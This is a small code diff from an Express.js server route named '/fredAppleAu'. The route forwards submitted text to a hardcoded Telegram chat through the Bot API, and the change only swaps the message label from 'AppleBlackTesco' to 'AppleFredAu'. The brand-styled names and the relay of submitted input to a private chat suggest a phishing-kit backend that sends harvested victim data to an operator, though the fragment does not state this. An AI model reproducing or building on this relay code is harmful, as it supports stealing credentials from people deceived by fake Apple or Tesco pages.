@@ -6428,7 +6428,7 @@ app.post("/fredAppleAu", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `AppleBlackTesco:\n${originalText}`,
+              text: `AppleFredAu:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
